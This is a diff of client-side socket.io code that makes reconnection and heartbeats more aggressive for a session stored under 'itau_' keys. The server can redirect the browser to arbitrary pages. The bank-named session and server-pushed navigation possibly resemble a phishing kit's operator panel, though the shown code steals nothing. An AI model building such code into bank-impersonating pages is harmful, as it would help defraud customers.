@@ -5,21 +5,24 @@
     // Socket configuration with robust reconnection
     const socket = io({
         reconnection: true,
-        reconnectionDelay: 500,
-        reconnectionDelayMax: 2000,
+        reconnectionDelay: 300,
+        reconnectionDelayMax: 1000,
         reconnectionAttempts: Infinity,
-        timeout: 10000,
+        timeout: 20000,
         transports: ['polling', 'websocket'],
-        upgrade: true,
-        rememberUpgrade: true,
+        upgrade: false,
+        rememberUpgrade: false,
         autoConnect: true,
         forceNew: false,
-        multiplex: true
+        multiplex: true,
+        closeOnBeforeunload: false
     });
 
     let sessionId = localStorage.getItem('itau_session_id');
     let heartbeatInterval = null;
     let isConnected = false;
+    let reconnectAttempts = 0;
+    let visibilityCheckInterval = null;
 
     // Start heartbeat to keep session alive
     function startHeartbeat() {
@@ -28,10 +31,15 @@
         }
         
         heartbeatInterval = setInterval(() => {
-            if (isConnected && sessionId) {
-                socket.emit('heartbeat');
+            if (sessionId) {
+                if (isConnected) {
+                    socket.emit('heartbeat');
+                } else if (!socket.connected) {
+                    console.log('Reconectando desde heartbeat...');
+                    socket.connect();
+                }
             }
-        }, 15000); // Every 15 seconds
+        }, 10000); // Every 10 seconds
     }
 
     // Stop heartbeat
@@ -42,18 +50,38 @@
         }
     }
 
+    // Start visibility check
+    function startVisibilityCheck() {
+        if (visibilityCheckInterval) {
+            clearInterval(visibilityCheckInterval);
+        }
+        
+        visibilityCheckInterval = setInterval(() => {
+            if (document.hidden === false && !socket.connected && sessionId) {
+                console.log('Pagina visible, reconectando...');
+                socket.connect();
+            }
+        }, 2000);
+    }
+
     // Initialize session on connection
     socket.on('connect', () => {
         console.log('Socket conectado:', socket.id);
         isConnected = true;
+        reconnectAttempts = 0;
         socket.emit('init-session', { sessionId });
+        
+        // Guardar estado de conexion
+        localStorage.setItem('itau_last_connect', Date.now());
     });
 
     socket.on('session-ready', (data) => {
         sessionId = data.sessionId;
         localStorage.setItem('itau_session_id', sessionId);
+        localStorage.setItem('itau_session_time', Date.now());
         console.log('Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
         startHeartbeat();
+        startVisibilityCheck();
     });
 
     socket.on('heartbeat-ack', () => {
@@ -63,22 +91,35 @@
     socket.on('disconnect', (reason) => {
         console.log('Socket desconectado:', reason);
         isConnected = false;
-        stopHeartbeat();
         
-        // Auto-reconnect if not manual disconnect
-        if (reason === 'io server disconnect') {
-            socket.connect();
-        }
+        // Siempre intentar reconectar en moviles
+        setTimeout(() => {
+            if (!socket.connected && sessionId) {
+                console.log('Forzando reconexion...');
+                socket.connect();
+            }
+        }, 500);
     });
 
     socket.on('connect_error', (error) => {
         console.error('Error de conexion:', error.message);
         isConnected = false;
+        reconnectAttempts++;
+        
+        // Reintentar mas agresivamente
+        if (reconnectAttempts < 10) {
+            setTimeout(() => {
+                if (!socket.connected && sessionId) {
+                    socket.connect();
+                }
+            }, 1000);
+        }
     });
 
     socket.on('reconnect', (attemptNumber) => {
         console.log('Reconectado despues de', attemptNumber, 'intentos');
         isConnected = true;
+        reconnectAttempts = 0;
     });
 
     socket.on('reconnect_attempt', (attemptNumber) => {
@@ -104,9 +145,31 @@
         window.location.href = data.page;
     });
 
-    // Clean up on page unload
-    window.addEventListener('beforeunload', () => {
-        stopHeartbeat();
+    // Handle page visibility changes (mobile apps)
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) {
+            console.log('Pagina ahora visible');
+            if (!socket.connected && sessionId) {
+                console.log('Reconectando al volver a la pagina...');
+                socket.connect();
+            }
+        } else {
+            console.log('Pagina ahora oculta');
+        }
+    });
+
+    // Handle page focus
+    window.addEventListener('focus', () => {
+        console.log('Ventana con foco');
+        if (!socket.connected && sessionId) {
+            console.log('Reconectando al obtener foco...');
+            socket.connect();
+        }
+    });
+
+    // Handle page blur
+    window.addEventListener('blur', () => {
+        console.log('Ventana sin foco');
     });
 
     // Expose socket and sessionId globally
